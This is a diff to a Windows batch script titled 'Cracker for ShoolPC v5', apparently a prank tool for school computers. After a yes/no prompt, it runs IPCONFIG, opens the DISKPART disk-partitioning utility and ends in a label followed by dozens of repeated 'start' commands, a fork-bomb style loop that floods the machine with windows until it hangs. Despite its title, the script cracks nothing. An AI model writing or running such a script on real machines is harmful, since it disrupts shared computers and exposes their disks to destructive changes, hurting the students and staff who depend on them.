@@ -1,11 +1,17 @@
 @echo OFF
-TITLE Cracker for ShoolPC v4    Develop by An0-gen
+TITLE Cracker for ShoolPC v5    Develop by An0-gen
 
 @echo OFF
 ECHO You want to Crack a Shool PC?
 ECHO Enter Y for yes
 ECHO Enter N for no
 CHOICE /c YN /m "Yes or No"
+
+@echo OFF
+IPCONFIG
+
+@echo OFF
+DISKPART
 
 a:
 start start start start start start start start start start start start start start start start start start start start start start start start start start start start
